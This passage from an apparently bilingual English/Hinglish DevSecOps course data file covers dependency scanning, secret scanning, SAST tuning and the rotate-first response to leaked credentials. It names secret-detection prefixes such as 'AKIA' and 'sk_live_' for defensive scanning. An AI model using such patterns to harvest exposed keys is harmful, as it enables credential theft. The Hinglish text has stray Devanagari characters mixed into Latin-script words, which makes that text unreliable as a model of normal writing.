        why: 'A credential is exposed the instant it is pushed to a remote, not when someone notices it, and for public repositories automated scrapers harvest new secrets within seconds — there are bots whose entire purpose is to watch the public commit firehose for key patterns and immediately test them. So by the time a CI scan flags the secret and a human reads the alert, the credential must be assumed to be in the hands of an attacker and possibly already in use. Deleting the line and force-pushing addresses none of this: the credential is still valid, so an attacker who copied it retains access, and the object itself remains in the repository\'s reflog, in every existing clone and fork, in CI caches, and in the platform\'s history for the pull request, so it has not even been removed. The correct order is to rotate first — revoke the exposed credential and issue a replacement, then check audit logs for use of the old one since the push — and only then rewrite history to remove the object, which is about preventing re-discovery rather than containing the exposure. And the durable fix is that the secret should never have been a literal in the first place: it should be a reference resolved at runtime from a secret manager, with a pre-commit hook and server-side push protection to stop the next one.',
        whyHi: 'Ek credential us instant exposed hai jab ye ek remote par pushed hota hai, na ki jab koi ise notice karता hai, aur public repositories ke liye automated scrapers naye secrets ko seconds mein harvest karते hain — aisे bots hain jinka poora purpose public commit firehose ko key patterns ke liye watch karना aur turant unhe test karना hai. To jab tak ek CI scan secret ko flag karता hai aur ek human alert padhता hai, credential ko ek attacker ke haathon mein maan lena chahिए. Line delete karना aur force-push karना is mein se kुछ address nahi karता: credential abhi bhi valid hai, aur object khud repository ke reflog mein, har existing clone aur fork mein rehता hai. Correct order pehle rotate karना hai — exposed credential revoke karो aur ek replacement issue karो — aur sirf phir history rewrite karना.',
      },
      {
        wrong: `# running SAST with default rules on a big repo -> 4,000 findings, 3% true positive
  - run: semgrep --config=auto .          # <-- "auto" = every community rule
  # output: 4,127 findings. spot check:
  #   - 800x "detected possible formatted string" on log lines
  #   - 600x "user input in file path" where the input is a validated enum
  #   - 400x rules for frameworks this repo doesn't use
  #   - ~120 plausible, ~40 real
  # nobody triages 4,127 findings. the report is downloaded, glanced at, archived.
  # SAST is now theatre.`,
        right: `# curate a ruleset; gate a tiny high-confidence set; expand over time
  - run: |
      semgrep \\
        --config p/owasp-top-ten \\           # curated, not "auto"
        --config ./.semgrep/                 # + your own rules for your patterns
        --baseline-commit $(git merge-base origin/main HEAD) \\  # NEW findings only
        --severity ERROR \\                    # gate ERROR; WARNING -> report
        --error .
  # start with maybe 15-30 rules you trust to be high-signal (injection sinks,
  # hardcoded crypto keys, disabled TLS verification, dangerous deserialization).
  # tune out the noisy ones with path-ignores + rule tweaks. add rules as you
  # find real bug classes. a 90%+ true-positive gate is one people respect.`,
        why: 'Static analysis tools ship broad default rulesets that are designed to demonstrate capability across every language and framework, not to be run as-is against a specific codebase, and doing so produces thousands of findings with a true-positive rate low enough that triaging them is not worth anyone\'s time. The result is that the SAST report becomes a compliance artifact that is generated, glanced at, and archived without action, which is worse than not running SAST because it creates the appearance of coverage. The effective approach is to curate: start from a small, well-regarded ruleset like the OWASP Top Ten pack plus a handful of custom rules for patterns specific to your code, gate only on the highest-confidence severity level, and scope to findings newly introduced relative to the main branch so pre-existing issues do not block current work. Tune out the rules that produce noise in your codebase through path ignores and rule adjustments, and add new rules deliberately as you discover real bug classes worth catching. A gate with a true-positive rate above ninety percent is one developers treat as real; a gate at three percent is one they learn to ignore.',
        whyHi: 'Static analysis tools broad default rulesets ship karते hain jо har language aur framework ke across capability demonstrate karने ke liye designed hain, na ki ek specific codebase ke against as-is run karने ke liye, aur aisा karना hazaron findings produce karता hai ek true-positive rate ke saath itna low ki unhe triage karना kisi ke time ke worth nahi hai. Result ye hai ki SAST report ek compliance artifact ban jaता hai jо generate, glanced at, aur archive kiya jaता hai bina action ke. Effective approach curate karना hai: ek chhote, well-regarded ruleset se shuru karो jaise OWASP Top Ten pack plus kुछ custom rules, sirf highest-confidence severity level par gate karो, aur main branch ke relative newly introduced findings tak scope karो. Ek gate ek true-positive rate ke saath navve percent se upar wo hai jise developers real treat karते hain.',
      },
    ],

    realWorld: [
      {
        en: '**The `AKIA...` in a public repo, used in minutes** — a widely reproduced experiment (and many real incidents) shows an AWS key committed to a public GitHub repo is found and used by bots within 1-5 minutes, typically to spin up crypto-mining EC2 instances. This is why the response to a leaked key is "rotate first, always" — by the time you see the alert, assume it is in use.',
        hi: '**Ek public repo mein `AKIA...`, minutes mein used** — ek widely reproduced experiment (aur kई real incidents) dikhाता hai ki ek public GitHub repo mein committed ek AWS key bots dwara 1-5 minutes mein found aur used hoती hai, typically crypto-mining EC2 instances spin up karने ke liye. Isliye ek leaked key ka response "pehle rotate karो, hamesha" hai.',
      },
      {
        en: '**`npm audit` fatigue** — many teams ran `npm audit` in CI, hit dozens of advisories in transitive dev dependencies (webpack loaders, etc.) with no fix or no prod impact, and ended up with `npm audit || true`. The lesson that shaped modern SCA config: `--omit=dev`, `--audit-level=high`, ignore-unfixed, and gate on production-reachable findings only.',
        hi: '**`npm audit` fatigue** — kई teams ne CI mein `npm audit` run kiya, transitive dev dependencies mein dozens of advisories hit kiye jinme koi fix ya koi prod impact nahi tha, aur `npm audit || true` ke saath end hue. Lesson: `--omit=dev`, `--audit-level=high`, ignore-unfixed, aur sirf production-reachable findings par gate karो.',
      },
      {
        en: '**`govulncheck` reachability cutting the list** — Go teams adopting `govulncheck` routinely report that of ~50 CVEs a version-only scanner flags in their module graph, only ~5-8 involve a vulnerable symbol their code actually calls. Reachability analysis turned an unmanageable list into a short, real one they could gate on.',
        hi: '**`govulncheck` reachability list cut karता hua** — `govulncheck` adopt karने wali Go teams routinely report karती hain ki ~50 CVEs mein se jо ek version-only scanner unke module graph mein flag karता hai, sirf ~5-8 ek vulnerable symbol involve karते hain jise unka code actually call karता hai. Reachability analysis ne ek unmanageable list ko ek short, real one mein badal diya.',
      },
    ],

    interviewQA: [
      {
        q: 'What is SCA, what does a vulnerability report contain, and how do you decide which findings to act on first?',
        qHi: 'SCA kya hai, ek vulnerability report mein kya hai, aur aap kaise decide karते ho konse findings par pehle action lena?',
        a: 'Software composition analysis takes your resolved dependency set — from a lockfile, an SBOM, or the packages installed in an image — and matches each component against vulnerability feeds like the NVD, GitHub Advisories, distro trackers, and OSV. For each match the report gives the package, the CVE, a severity, your installed version, the fixed version if one exists, and whether a fix is available at all. To prioritise, you look past the raw severity. The fixed-version field is the most actionable: no fix means you cannot remediate by upgrading and it becomes a tracked item; a named fix means you can act and should gate new instances. Reachability is next: does your code actually call the vulnerable function? A CVE in an unused code path is far lower priority than one on a hot path, and tools like govulncheck or commercial reachability analysis routinely cut a raw list by five to ten times. Exploitability matters: is the CVE in CISA\'s Known Exploited Vulnerabilities catalogue, or does it have a high EPSS score? A KEV entry means patch now regardless of CVSS. And you record your conclusions as VEX statements so the same analysis is not repeated every scan. The practical gate is: newly introduced by this change, has a fix, and is reachable or in KEV — everything else is a tracked issue with an SLA.',
        aHi: 'Software composition analysis aapke resolved dependency set ko leता hai aur har component ko vulnerability feeds ke against match karता hai jaise NVD, GitHub Advisories, distro trackers, aur OSV. Har match ke liye report package, CVE, ek severity, aapki installed version, fixed version agar ek exist karता hai, aur kya ek fix available hai at all deता hai. Prioritise karने ke liye, aap raw severity se aage dekhते ho. Fixed-version field sabse actionable hai. Reachability agli hai: kya aapka code actually vulnerable function ko call karता hai? Exploitability matter karता hai: kya CVE CISA ke Known Exploited Vulnerabilities catalogue mein hai? Aur aap apne conclusions ko VEX statements ke roop mein record karते ho. Practical gate hai: is change dwara newly introduced, ek fix hai, aur reachable ya KEV mein — baaki sab ek tracked issue ek SLA ke saath.',
      },
      {
        q: 'A secret scanner flags an AWS key committed and pushed an hour ago. Walk through the response, in order, and explain why the order matters.',
        qHi: 'Ek secret scanner ek ghanta pehle committed aur pushed ek AWS key flag karता hai. Response ke through chalो, order mein.',
        a: 'The response is: rotate first, purge history second, prevent recurrence third — and the order is not negotiable. Rotate first because a credential is exposed the moment it reaches the remote, not when someone notices, and for public repositories automated scrapers find and test new keys within seconds to minutes; by the time you are reading the alert an hour later, you must assume the key is in an attacker\'s hands and possibly in use. So step one is to deactivate the exposed access key, issue a replacement, update wherever the application reads it from, and check the audit logs — CloudTrail for AWS — for any use of the old key from unexpected sources since the push. Only then, step two, rewrite history to remove the object, with git filter-repo or BFG, coordinating with everyone to re-clone. This step is about stopping the secret from being re-discovered and re-flagged, not about containing the exposure — the object is already in every existing clone, fork, CI cache, and the platform\'s pull-request history, so removing it from the branch tip does not undo the leak. If you did step two first and skipped or delayed step one, you would have spent effort on history rewriting while the live, valid credential continued to be usable. Step three is prevention: the value should have been a reference to a secret manager resolved at runtime, never a literal, and you add a pre-commit hook plus server-side push protection so the next attempt is blocked before it leaves a laptop.',
        aHi: 'Response hai: pehle rotate karो, history purge karो doosra, recurrence prevent karो teesra — aur order negotiable nahi hai. Pehle rotate karो kyunki ek credential us moment exposed hai jab ye remote tak pahunchता hai, na ki jab koi notice karता hai, aur public repositories ke liye automated scrapers naye keys ko seconds se minutes mein find aur test karते hain; jab tak aap ek ghante baad alert padh rahe ho, aapko maan lena chahिए ki key ek attacker ke haathon mein hai. To step one exposed access key ko deactivate karना, ek replacement issue karना, update karना jahaan se application ise padhती hai, aur audit logs check karना hai. Sirf phir, step two, history rewrite karना object remove karने ke liye. Ye step secret ko re-discovered hone se rोkने ke baare mein hai, exposure contain karने ke baare mein nahi. Step three prevention hai.',
      },
      {
        q: 'Why do SAST and dependency scanners so often get disabled, and how do you configure them so they are trusted?',
        qHi: 'SAST aur dependency scanners itni aksar disable kyun ho jaते hain, aur aap unhe kaise configure karते ho taaki wo trusted hon?',
        a: 'They get disabled because they fire too often on things developers cannot or should not act on, and a gate that mostly produces un-actionable failures trains people to route around it. For dependency scanning the noise sources are: findings with no available fix, findings in development-only dependencies that never ship to production, and findings in code paths the application never executes. For SAST it is running broad default rulesets that are built to showcase the tool across every framework rather than to run against one specific codebase, producing thousands of findings at a low true-positive rate. The configuration that earns trust is selective on both. For SCA: gate only on findings that are newly introduced by the change, have a fix available, and are reachable or in the Known Exploited Vulnerabilities catalogue; send everything else to a tracked backlog with SLAs; use ignore-unfixed and a dated, owned baseline file. For SAST: start from a small curated ruleset like an OWASP Top Ten pack plus custom rules for your own patterns, gate only the highest-confidence severity, scope to findings new relative to the main branch, and tune out noisy rules through path ignores. In both cases suppressions must carry a reason and an expiry and be reviewed, and everything feeds one dashboard with a downward trend line. A gate that fires rarely and always on something real retains its authority; one at a three-percent true-positive rate does not.',
        aHi: 'Wo disable ho jaते hain kyunki wo un cheezon par too often fire karते hain jinpar developers action nahi le sakते ya nahi lena chahिए, aur ek gate jо zyादातर un-actionable failures produce karता hai logon ko iske around route karना sikhाता hai. Dependency scanning ke liye noise sources hain: koi available fix nahi wale findings, development-only dependencies mein findings jо kabhi production tak nahi ship hoती, aur code paths mein findings jо application kabhi execute nahi karता. SAST ke liye ye broad default rulesets run karना hai. Configuration jо trust earn karता hai dono par selective hai. SCA ke liye: sirf un findings par gate karो jо change dwara newly introduced hain, ek fix available hai, aur reachable ya Known Exploited Vulnerabilities catalogue mein hain. SAST ke liye: ek chhote curated ruleset se shuru karो. Dono cases mein suppressions ko ek reason aur ek expiry carry karना chahिए.',
      },
    ],

    exercises: [
      {
        task: 'In a comment, explain SCA: its input/output, the databases it matches against, and the five dimensions (severity, fixed version, reachability, exploitability/KEV, VEX) that turn a CVE list into a priority order.',
        taskHi: 'Ek comment mein, SCA samjhाओ aur paanch dimensions jо ek CVE list ko ek priority order mein badalते hain.',
        hint: 'SCA (Software Composition Analysis) = dependency CVE scanning. INPUT: your resolved dependency set — the lockfile, an SBOM, or the packages actually installed in an image. DOES: matches each component (by purl + version) against VULNERABILITY DATABASES — NVD, GitHub Advisories, language-ecosystem advisory feeds, Linux distro trackers, the OSV aggregator. OUTPUT per finding: package | CVE ID | severity | installed version | FIXED version | is-a-fix-available. Tools: Trivy, Grype, Snyk, Dependabot, `npm audit`, `pip-audit`, `govulncheck`, `bundler-audit`. Runs: EVERY PR (gate new criticals-with-a-fix) + NIGHTLY against the stored SBOMs (new CVEs hit old shipped versions). THE FIVE DIMENSIONS that turn a raw CVE list into a priority order: (1) SEVERITY (CVSS) — a STARTING POINT, not a verdict; assigned WITHOUT knowledge of your usage, so it over/under-states real risk routinely. (2) FIXED VERSION — the single most actionable field: EMPTY = no patch exists → you CANNOT gate on it, it becomes a tracked item; a NAMED version (`"2.3.2"`) = a fix exists → GATE new instances. (3) REACHABILITY — does your code ACTUALLY CALL the vulnerable function/symbol? A CVE in a code path you never execute is far lower priority than one on a hot path; `govulncheck` (Go) / commercial reachability analysis routinely cut a raw list 5-10x. (4) EXPLOITABILITY — is it in CISA KEV (Known Exploited Vulnerabilities — actively used against people)? EPSS probability score? A KEV entry = PATCH NOW regardless of CVSS; a theoretical DoS in a CLI flag you never pass = a low-priority ticket. (5) VEX (Vulnerability Exploitability eXchange) — your RECORDED machine-readable judgement ("present, NOT exploitable, because <reason>") so the same triage is not repeated every scan. THE PRACTICAL GATE: newly introduced by THIS change AND has a fix AND (reachable OR in KEV). Everything else → a tracked issue with an SLA (e.g. CRITICAL 7d, HIGH 30d).',
        hintHi: 'SCA = dependency CVE scanning. INPUT: aapka resolved dependency set (lockfile / SBOM / image mein installed packages). DOES: har component (purl + version se) ko VULNERABILITY DATABASES ke against match karता hai — NVD, GitHub Advisories, distro trackers, OSV. OUTPUT: package | CVE | severity | installed version | FIXED version | fix-available. Tools: Trivy, Grype, Snyk, `npm audit`, `govulncheck`. Runs: HAR PR + NIGHTLY SBOMs par. PAANCH DIMENSIONS: (1) SEVERITY (CVSS) — starting point, verdict nahi; aapke usage ke bina assigned. (2) FIXED VERSION — sabse actionable: EMPTY = koi patch nahi → gate nahi kar sakते; NAMED = fix hai → GATE new instances. (3) REACHABILITY — kya aapka code vulnerable function CALL karता hai? `govulncheck` list 5-10x cut karता hai. (4) EXPLOITABILITY — KEV mein hai? EPSS? KEV = ABHI PATCH KARO. (5) VEX — aapkा recorded judgement. GATE: newly introduced AND fix hai AND (reachable OR KEV).',
      },
      {
        task: 'In a comment, explain secret scanning: what it detects, the four places it runs, and the exact incident-response order (rotate → purge history → prevent) with why the order is fixed.',
        taskHi: 'Ek comment mein, secret scanning samjhाओ: kya detect karता hai, chaar jagah, aur exact incident-response order.',
        hint: 'SECRET SCANNING detects credentials in CODE and — critically — in GIT HISTORY: provider-specific patterns (AWS `AKIA...`, GitHub `ghp_...`, Stripe `sk_live_...`, Slack `xoxb-...`, GCP service-account JSON, Twilio, SendGrid), PEM-encoded PRIVATE KEYS, JWTs, and generic HIGH-ENTROPY strings in suspicious contexts. Tools: gitleaks, trufflehog, Trivy (`--scanners secret`), GitHub secret scanning. FOUR PLACES IT RUNS: (1) PRE-COMMIT HOOK — block the secret BEFORE it is committed (best case — it never enters git). (2) CI CHECK — catch anything that slipped past the hook (hooks are local + bypassable with `--no-verify`). (3) SERVER-SIDE PUSH PROTECTION — the remote (GitHub/GitLab) rejects the push itself. (4) A ONE-TIME FULL-HISTORY SCAN — existing secrets already buried in old commits. THE INCIDENT-RESPONSE ORDER (NOT negotiable): (1) ROTATE FIRST — a credential is compromised THE INSTANT it reaches the remote, NOT when someone notices; automated scrapers harvest public-repo secrets within SECONDS-TO-MINUTES (bots watch the public commit firehose and immediately test keys — an `AKIA` key is typically used within 1-5 min, usually for crypto-mining). By the time you read the alert an hour later, ASSUME the key is in an attacker\'s hands and possibly in use. So: deactivate the exposed key, issue a replacement, update the secret store / wherever the app reads it, and CHECK THE AUDIT LOGS (CloudTrail) for use of the old key from unexpected IPs since the push. (2) PURGE HISTORY SECOND — `git filter-repo --path <file> --invert-paths` or BFG; coordinate everyone to re-clone. This stops RE-DISCOVERY / RE-FLAGGING — it does NOT contain the exposure (the object is already in every clone, fork, CI cache, the PR\'s "files changed", GitHub\'s API for old commits; a force-push removes it from NO ONE else\'s copy). (3) PREVENT RECURRENCE THIRD — the value should have been a RUNTIME REFERENCE to a secret manager, never a literal; add the pre-commit hook + push protection; add the pattern to the scanner if it was a custom token format. WHY THE ORDER IS FIXED: if you do step 2 first (delete the line, force-push, close the alert), you have spent effort on history rewriting while the LIVE, VALID credential stays usable — "removing the commit" is useless without the rotation.',
        hintHi: 'SECRET SCANNING code aur — critically — GIT HISTORY mein credentials detect karता hai: provider patterns (AWS `AKIA...`, GitHub `ghp_...`, Stripe `sk_live_...`), PRIVATE KEYS, JWTs, HIGH-ENTROPY strings. Tools: gitleaks, trufflehog, Trivy `--scanners secret`. CHAAR JAGAH: (1) PRE-COMMIT HOOK. (2) CI CHECK. (3) SERVER-SIDE PUSH PROTECTION. (4) ONE-TIME FULL-HISTORY SCAN. INCIDENT-RESPONSE ORDER (NOT negotiable): (1) ROTATE FIRST — credential us INSTANT compromised hai jab ye remote tak pahunchता hai; scrapers SECONDS-TO-MINUTES mein harvest karते hain (`AKIA` key 1-5 min mein used, crypto-mining). Deactivate karो, replacement issue karो, secret store update karो, CloudTrail CHECK karो. (2) PURGE HISTORY SECOND — `git filter-repo` / BFG. Ye RE-DISCOVERY rोkता hai — exposure CONTAIN nahi karता (object har clone/fork/cache mein hai). (3) PREVENT THIRD — runtime reference to a secret manager, pre-commit hook + push protection. ORDER FIXED KYUN: step 2 pehle karो to LIVE credential usable rehта hai.',
      },
      {
        task: 'In a comment, describe SAST, DAST, and IaC scanning (what each parses, what it finds, where it runs, its speed) and the rule for gating a scanner without it getting disabled.',
        taskHi: 'Ek comment mein, SAST, DAST, aur IaC scanning describe karो aur ek scanner ko disable hue bina gate karने ka rule.',
        hint: 'SAST (Static Application Security Testing) — parses YOUR OWN source into an AST + a DATA-FLOW GRAPH; looks for: TAINT PATHS (user input → a SQL string / a shell command / a file path), use of known-UNSAFE APIs, weak or misused CRYPTO, dangerous DESERIALIZATION. Tools: Semgrep, CodeQL, Bandit (Python), gosec (Go). Runs: CI + pre-commit. Speed: fast-ish. KEY: TUNED rulesets massively outperform DEFAULT ("auto") rulesets — defaults are built to showcase the tool across every framework, produce THOUSANDS of findings at a ~3% true-positive rate → the report gets archived, SAST becomes theatre. DAST (Dynamic Application Security Testing) — drives a RUNNING instance: fuzzes parameters, checks security HEADERS + cookie flags + TLS config, attempts AUTH BYPASS, tests injection reachable via the live API. Tools: OWASP ZAP, Burp. Runs: against a DEPLOYED target (staging). Speed: SLOW → nightly / pre-release, NOT per-PR. IaC SCANNING — parses Terraform / CloudFormation / Kubernetes manifests / Dockerfiles for INSECURE CONFIG: public storage buckets, security groups open to `0.0.0.0/0`, missing encryption at rest, privileged containers, `USER root`, `:latest` tags, no resource limits. Tools: Trivy config, Checkov, tfsec, kube-linter, Kubescape. Runs: EVERY PR. Speed: FAST + FULLY OFFLINE. THE RULE FOR GATING WITHOUT IT GETTING DISABLED: a gate that mostly produces UN-ACTIONABLE failures trains people to route around it (`--exit-code 0`, `continue-on-error`, bulk `# nosec`, "temporarily" disabled → permanent). So: (a) gate ONLY on NEW findings (baseline / ignore-file for the pre-existing backlog, each entry DATED + OWNED). (b) gate on the CONJUNCTION that means real risk: severity ≥ HIGH AND a fix is available AND (reachable OR in KEV). (c) everything else → a TRACKED ISSUE with a remediation SLA (CRITICAL 7d, HIGH 30d), NOT a build failure. (d) suppressions need a REASON + an EXPIRY + review — no permanent `# nosec`. (e) one DASHBOARD: open findings by severity / age / team, trending DOWN. (f) for SAST specifically: start with 15-30 high-signal rules (a curated pack like OWASP Top Ten + your own), gate only the highest-confidence severity, expand as you find real bug classes — aim for a 90%+ true-positive gate. A gate that fires RARELY and ALWAYS on something real keeps its authority.',
        hintHi: 'SAST — AAPKE source ko ek AST + DATA-FLOW GRAPH mein parse karता hai; TAINT PATHS (user input → SQL string), unsafe APIs, weak crypto dhoondhता hai. Semgrep, CodeQL, Bandit, gosec. CI + pre-commit. TUNED rulesets >> DEFAULT (defaults ~3% true-positive → theatre). DAST — ek RUNNING instance drive karता hai: params fuzz, headers/cookies/TLS, auth bypass. OWASP ZAP, Burp. DEPLOYED target (staging). SLOW → nightly. IaC — Terraform / CFN / K8s / Dockerfile ko insecure config ke liye parse karता hai: public buckets, `0.0.0.0/0`, no encryption, privileged containers, `USER root`. Trivy config, Checkov, tfsec. HAR PR. FAST + OFFLINE. GATING RULE: (a) sirf NEW findings par gate (baseline dated+owned). (b) severity ≥ HIGH AND fix available AND (reachable OR KEV). (c) baaki → TRACKED ISSUE + SLA. (d) suppressions ko reason + expiry chahिए. (e) ek DASHBOARD trending DOWN. (f) SAST: 15-30 high-signal rules se shuru. RARELY + ALWAYS-real gate authority rakhता hai.',
      },
    ],

    keyTakeaways: [
      'SCA matches your dependency set (lockfile / SBOM / installed packages) against vuln feeds (NVD, GitHub Advisories, OSV) → package | CVE | severity | installed | FIXED version. Prioritise past raw severity: FIXED VERSION (empty = track, named = gate), REACHABILITY (does your code call it? — `govulncheck` cuts the list 5-10x), EXPLOITABILITY (in CISA KEV = patch now), VEX (record your judgement). Gate: NEW + fixed + (reachable OR KEV).',
      'SECRET SCANNING finds provider-shaped keys (`AKIA`, `ghp_`, `sk_live_`), private keys, and high-entropy strings in code AND git HISTORY. Run it in four places: pre-commit hook, CI, server-side push protection, one-time history scan. A pushed secret is compromised INSTANTLY (public-repo scrapers use `AKIA` keys within minutes).',
      'LEAKED-SECRET RESPONSE, fixed order: (1) ROTATE — revoke + reissue + check audit logs (CloudTrail) for use since the push; assume it is already in use. (2) PURGE HISTORY — `git filter-repo` / BFG; this stops re-discovery, it does NOT contain the exposure (the object is in every clone/fork/cache). (3) PREVENT — it should have been a secret-manager reference, not a literal; add the hook + push protection. Deleting the line and force-pushing without step 1 is useless.',
      'THE OTHER SCANNERS: SAST parses your source for taint paths / unsafe APIs (Semgrep, CodeQL — CI, fast, but TUNE the rules or it is 3% true-positive theatre); DAST drives a running app for headers / auth / injection (ZAP — staging, slow, nightly); IaC scanning parses Terraform / K8s / Dockerfiles for public buckets / `0.0.0.0/0` / privileged containers (Trivy config, Checkov — every PR, fast, offline).',
      'GATE WITHOUT NOISE or the gate gets disabled and "green" means nothing: gate ONLY on NEW findings (baseline the backlog, dated + owned), and only when severity ≥ HIGH AND a fix exists AND (reachable OR in KEV). Everything else → a tracked issue with an SLA (CRITICAL 7d, HIGH 30d). Suppressions need a reason + expiry + review. One dashboard, trending down. A gate that fires rarely and always on something real keeps its authority.',
    ],
    keyTakeawaysHi: [
      'SCA aapke dependency set (lockfile / SBOM / installed packages) ko vuln feeds (NVD, GitHub Advisories, OSV) ke against match karता hai → package | CVE | severity | installed | FIXED version. Raw severity se aage prioritise karो: FIXED VERSION (empty = track, named = gate), REACHABILITY (kya aapka code ise call karता hai? — `govulncheck` list 5-10x cut karता hai), EXPLOITABILITY (CISA KEV mein = ab patch karो), VEX (apna judgement record karो). Gate: NEW + fixed + (reachable OR KEV).',
      'SECRET SCANNING provider-shaped keys (`AKIA`, `ghp_`, `sk_live_`), private keys, aur high-entropy strings code AUR git HISTORY mein dhoondhता hai. Ise chaar jagah run karो: pre-commit hook, CI, server-side push protection, one-time history scan. Ek pushed secret INSTANTLY compromised hai (public-repo scrapers `AKIA` keys ko minutes mein use karते hain).',
      'LEAKED-SECRET RESPONSE, fixed order: (1) ROTATE — revoke + reissue + audit logs (CloudTrail) check karो; maan lो ye already use mein hai. (2) PURGE HISTORY — `git filter-repo` / BFG; ye re-discovery rोkता hai, exposure CONTAIN nahi karता (object har clone/fork/cache mein hai). (3) PREVENT — ye ek secret-manager reference hona chahिए tha, ek literal nahi; hook + push protection add karो. Line delete karके force-push karना bina step 1 ke useless hai.',
      'DOOSRE SCANNERS: SAST aapke source ko taint paths / unsafe APIs ke liye parse karता hai (Semgrep, CodeQL — CI, fast, par rules TUNE karो warna 3% true-positive theatre); DAST ek running app drive karता hai headers / auth / injection ke liye (ZAP — staging, slow, nightly); IaC scanning Terraform / K8s / Dockerfiles ko public buckets / `0.0.0.0/0` / privileged containers ke liye parse karता hai (Trivy config, Checkov — har PR, fast, offline).',
      'BINA NOISE KE GATE karो warna gate disable ho jaता hai aur "green" ka matlab kuch nahi: SIRF NEW findings par gate karो (backlog ko baseline karो, dated + owned), aur sirf jab severity ≥ HIGH AND ek fix exist karता hai AND (reachable OR KEV mein). Baaki sab → ek tracked issue ek SLA ke saath (CRITICAL 7d, HIGH 30d). Suppressions ko ek reason + expiry + review chahिए. Ek dashboard, trending down. Ek gate jо rarely aur hamesha kisi real cheez par fire karता hai apni authority rakhता hai.',
    ],
  },
];

